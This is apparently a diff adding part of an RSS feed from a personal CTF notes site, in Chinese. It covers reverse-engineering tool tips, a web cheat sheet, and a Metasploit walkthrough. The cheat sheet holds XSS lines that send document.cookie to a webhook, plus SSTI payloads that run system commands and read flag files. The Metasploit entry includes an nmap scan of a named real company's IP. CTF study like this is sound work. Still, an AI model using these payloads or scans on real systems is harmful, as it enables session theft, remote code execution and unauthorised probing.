+.rodata:0000000000002008 ; DATA XREF: main+8↑o
+.rodata:0000000000002008 dd 5Fh, 33h, 6Eh, 67h, 69h, 6Eh, 2 dup(65h), 72h, 35h, 7Dh, 0
+&lt;/code>&lt;/pre>$\downarrow$
+&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 text &amp;#34;UTF-32LE&amp;#34;, &amp;#39;FLAG{h311O_revers1ng_3ngineer5}&amp;#39;,0
+&lt;/code>&lt;/pre>:::&lt;/li>
+&lt;li>如何快速把bytes dump出來
+:::spoiler
+&lt;ol>
+&lt;li>選擇要輸出的bytes
+&lt;img src="https://hackmd.io/_uploads/Syc9UkTM6.png" alt="" />&lt;/li>
+&lt;li>按Shift+E，跳出的視窗選擇想要的格式，再直接複製即可
+&lt;img src="https://hackmd.io/_uploads/SJ7a8ypfT.png" alt="" />
+:::&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>如果函式沒有return東西的話，可以右鍵該函示，選擇&lt;code>Remove return value&lt;/code>或是Shift+Del
+:::spoiler
+&lt;img src="https://hackmd.io/_uploads/HkRk3JpG6.png" alt="" />
+:::&lt;/li>
+&lt;li>如果function中的宣告很多，可以右鍵選擇&lt;code>Collapse declarations&lt;/code>
+:::spoiler
+&lt;img src="https://hackmd.io/_uploads/SkOXU4AMa.png" alt="" />
+:::&lt;/li>
+&lt;/ul>
+&lt;h2 id="x64dbg-常用快捷鍵">
+ x64dbg 常用快捷鍵
+ &lt;a class="anchor" href="#x64dbg-%e5%b8%b8%e7%94%a8%e5%bf%ab%e6%8d%b7%e9%8d%b5">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>F2: 設定中斷點&lt;/li>
+&lt;li>F9: 繼續執行&lt;/li>
+&lt;li>F8: 步過&lt;/li>
+&lt;li>F7: 步入&lt;/li>
+&lt;li>Ctrl+F9: 執行到 ret&lt;/li>
+&lt;li>==Ctrl+G==: goto&lt;/li>
+&lt;li>==Space==: 修改組譯&lt;/li>
+&lt;/ul>
+&lt;h3 id="靜態分析">
+ 靜態分析
+ &lt;a class="anchor" href="#%e9%9d%9c%e6%85%8b%e5%88%86%e6%9e%90">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>PEview&lt;/li>
+&lt;li>PEViewer&lt;/li>
+&lt;li>PE-bear&lt;/li>
+&lt;/ul>
+&lt;h3 id="動態分析">
+ 動態分析
+ &lt;a class="anchor" href="#%e5%8b%95%e6%85%8b%e5%88%86%e6%9e%90">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>OllyDbg&lt;/li>
+&lt;li>x64dbg&lt;/li>
+&lt;li>IDA&lt;/li>
+&lt;li>Ghidra&lt;/li>
+&lt;li>Windbg&lt;/li>
+&lt;li>PEtool&lt;/li>
+&lt;/ul>
+&lt;h3 id="process相關的操作與資訊">
+ Process相關的操作與資訊
+ &lt;a class="anchor" href="#process%e7%9b%b8%e9%97%9c%e7%9a%84%e6%93%8d%e4%bd%9c%e8%88%87%e8%b3%87%e8%a8%8a">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>Procexp &amp;amp; Process Hacker
+好看版的工作管理員&lt;/li>
+&lt;li>Procmon
+監控程序行為
+Registry
+File system
+Network
+Process/Thread&lt;/li>
+&lt;/ul>
+&lt;h3 id="好用的解題工具">
+ 好用的解題工具
+ &lt;a class="anchor" href="#%e5%a5%bd%e7%94%a8%e7%9a%84%e8%a7%a3%e9%a1%8c%e5%b7%a5%e5%85%b7">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>&lt;a href="https://docs.angr.io/en/latest/appendix/cheatsheet.html">angr - cheatsheet&lt;/a>: &lt;code>$ pip install angr claripy&lt;/code>&lt;/li>
+&lt;li>z3: &lt;code>$ pip install z3-solver&lt;/code>&lt;/li>
+&lt;/ul></description></item><item><title>Web Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/web-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/web-cheat-sheet/</guid><description>&lt;h1 id="web-cheat-sheet">
+ Web Cheat Sheet
+ &lt;a class="anchor" href="#web-cheat-sheet">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="online-tools">
+ Online Tools
+ &lt;a class="anchor" href="#online-tools">#&lt;/a>
+&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Fuck&lt;/th>
+ &lt;th>Beautifier&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;a href="http://www.jsfuck.com/">jsfuck&lt;/a>&lt;/td>
+ &lt;td>&lt;a href="http://www.jsnice.org/">JSNice&lt;/a>&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;a href="https://utf-8.jp/public/jjencode.html">jjencode&lt;/a>&lt;/td>
+ &lt;td>&lt;a href="https://beautifier.io/">JS 反混淆器&lt;/a>: 可以反混淆或解密JS的檔案&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;a href="https://utf-8.jp/public/aaencode.html">aaencode&lt;/a>&lt;/td>
+ &lt;td>&lt;a href="https://js.wfuapp.com/">JS 壓縮+加密+混淆+美化&lt;/a>&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;a href="https://esolangs.org/wiki/Language_list">Esolang List&lt;/a>&lt;/td>
+ &lt;td>&lt;a href="https://www.53lu.com/tool/jsfuckdecode/">JS Fuck Decode&lt;/a>&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;/td>
+ &lt;td>&lt;a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html">aadecode&lt;/a>&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;h2 id="cheat-sheet">
+ Cheat-Sheet
+ &lt;a class="anchor" href="#cheat-sheet">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS-CheatSheet&lt;/a>
+利用XSS把session打到webhook上:
+&lt;pre tabindex="0">&lt;code class="language-javascript?" data-lang="javascript?">window.location=&amp;lt;requestbin.com&amp;gt;/?a+document.cookie
+// or
+fetch(&amp;#34;https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194&amp;#34;, { method: &amp;#39;GET&amp;#39;, headers: { &amp;#39;Cookie&amp;#39;: document.cookie } })
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%19Injection/README.md">All-Injection&lt;/a>&lt;/li>
+&lt;li>SSTI Payload: 記得找==os._wrap_close==
+&lt;pre tabindex="0">&lt;code>{{().__class__.__base__.__subclasses__()[132].__init__.__globals__[&amp;#39;system&amp;#39;](&amp;#39;id&amp;#39;)}}
+{{self.__init__.__globals__.__builtins__.__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;cat%20Flag.txt&amp;#34;).read()}}
+{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, &amp;#34;./flag.txt&amp;#34;)}}
+{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;popen&amp;#39;](&amp;#34;cat /flag.txt&amp;#34;)}}
+{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower())}}
+{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;spawnl&amp;#39;](&amp;#39;P_WAIT&amp;#39;, &amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower())}}
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;/ul>
+&lt;h2 id="others">
+ Others
+ &lt;a class="anchor" href="#others">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>wasm $\to$ c: &lt;a href="https://github.com/WebAssembly/wabt">wabt&lt;/a>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!"># 按照說明build完後進到./build
+$ ./wasm2c {wasm file path} -o {output c file path}
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>Webhook
+&lt;a href="https://webhook.site/">Webhook.site&lt;/a>
+&lt;a href="https://beeceptor.com/">Beeceptor&lt;/a>
+&lt;a href="https://ngrok.com/">Ngrok&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>利用Metasploit Framework測試一些網站</title><link>https://bernie6401.github.io/docs/tools/ctf/%E5%88%A9%E7%94%A8metasploit-framework%E6%B8%AC%E8%A9%A6%E4%B8%80%E4%BA%9B%E7%B6%B2%E7%AB%99/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/%E5%88%A9%E7%94%A8metasploit-framework%E6%B8%AC%E8%A9%A6%E4%B8%80%E4%BA%9B%E7%B6%B2%E7%AB%99/</guid><description>&lt;h1 id="利用metasploit-framework測試一些網站">
+ 利用Metasploit Framework測試一些網站
+ &lt;a class="anchor" href="#%e5%88%a9%e7%94%a8metasploit-framework%e6%b8%ac%e8%a9%a6%e4%b8%80%e4%ba%9b%e7%b6%b2%e7%ab%99">#&lt;/a>
+&lt;/h1>
+&lt;p>[TOC]&lt;/p>
+&lt;h2 id="cheat-sheet">
+ &lt;a href="https://ithelp.ithome.com.tw/articles/10279483?sc=hot">Cheat Sheet&lt;/a>
+ &lt;a class="anchor" href="#cheat-sheet">#&lt;/a>
+&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo msfdb init &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> msfconsole
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; nmap -vv &lt;span style="color:#f92672">{&lt;/span>IP&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. nmap -vv 127.0.0.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; search &lt;span style="color:#f92672">{&lt;/span>http/ssh/ftp...關鍵字&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. search rce&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; use &lt;span style="color:#f92672">{&lt;/span>腳本位置&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. use exploit/unix/http/cacti_filter_sqli_rce&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 exploit&lt;span style="color:#f92672">(&lt;/span>XXX&lt;span style="color:#f92672">)&lt;/span> &amp;gt; show option &lt;span style="color:#75715e"># 顯示該腳本需要哪一些參數&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 exploit&lt;span style="color:#f92672">(&lt;/span>XXX&lt;span style="color:#f92672">)&lt;/span> &amp;gt; set &lt;span style="color:#f92672">{&lt;/span>option name&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#f92672">{&lt;/span>參數&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. set RHOST 127.0.0.1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="smartdaily">
+ &lt;a href="https://www.smartdaily.com.tw/">SmartDaily&lt;/a>
+ &lt;a class="anchor" href="#smartdaily">#&lt;/a>
+&lt;/h2>
+&lt;p>IP: &lt;code>34.81.5.101&lt;/code>
+&lt;a href="https://securityheaders.com/?q=https%3A%2F%2Fwww.smartdaily.com.tw%2F&amp;amp;followRedirects=on">Security Header Result&lt;/a>&lt;/p>
+&lt;h3 id="nmap">
+ nmap
+ &lt;a class="anchor" href="#nmap">#&lt;/a>
+&lt;/h3>
+&lt;p>:::spoiler nmap Result&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -vv 34.81.5.101
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> exec: nmap -vv 34.81.5.101
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Starting Nmap 7.94 &lt;span style="color:#f92672">(&lt;/span> https://nmap.org &lt;span style="color:#f92672">)&lt;/span> at 2023-10-02 01:49 EDT
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Initiating Ping Scan at 01:49
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning 34.81.5.101 &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> ports&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Completed Ping Scan at 01:49, 0.01s elapsed &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> total hosts&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Initiating Parallel DNS resolution of &lt;span style="color:#ae81ff">1&lt;/span> host. at 01:49
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Completed Parallel DNS resolution of &lt;span style="color:#ae81ff">1&lt;/span> host. at 01:49, 0.01s elapsed
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Initiating Connect Scan at 01:49
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning 101.5.81.34.bc.googleusercontent.com &lt;span style="color:#f92672">(&lt;/span>34.81.5.101&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> ports&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 443/tcp on 34.81.5.101
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 80/tcp on 34.81.5.101
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">0&lt;/span> to &lt;span style="color:#ae81ff">5&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">14&lt;/span> dropped probes since last increase.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">5&lt;/span> to &lt;span style="color:#ae81ff">10&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">11&lt;/span> dropped probes since last increase.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">10&lt;/span> to &lt;span style="color:#ae81ff">20&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">11&lt;/span> dropped probes since last increase.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Increasing send delay &lt;span style="color:#66d9ef">for&lt;/span> 34.81.5.101 from &lt;span style="color:#ae81ff">20&lt;/span> to &lt;span style="color:#ae81ff">40&lt;/span> due to &lt;span style="color:#ae81ff">11&lt;/span> out of &lt;span style="color:#ae81ff">15&lt;/span> dropped probes since last increase.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Completed Connect Scan at 01:50, 75.06s elapsed &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> total ports&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 101.5.81.34.bc.googleusercontent.com &lt;span style="color:#f92672">(&lt;/span>34.81.5.101&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received syn-ack &lt;span style="color:#f92672">(&lt;/span>0.0085s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2023-10-02 01:49:05 EDT &lt;span style="color:#66d9ef">for&lt;/span> 75s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#ae81ff">998&lt;/span> filtered tcp ports &lt;span style="color:#f92672">(&lt;/span>no-response&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>443/tcp open https syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Read data files from: /usr/bin/../share/nmap
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap &lt;span style="color:#66d9ef">done&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span> IP address &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> host up&lt;span style="color:#f92672">)&lt;/span> scanned in 75.09 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
+開的Port: 80/443&lt;/p></description></item></channel></rss>
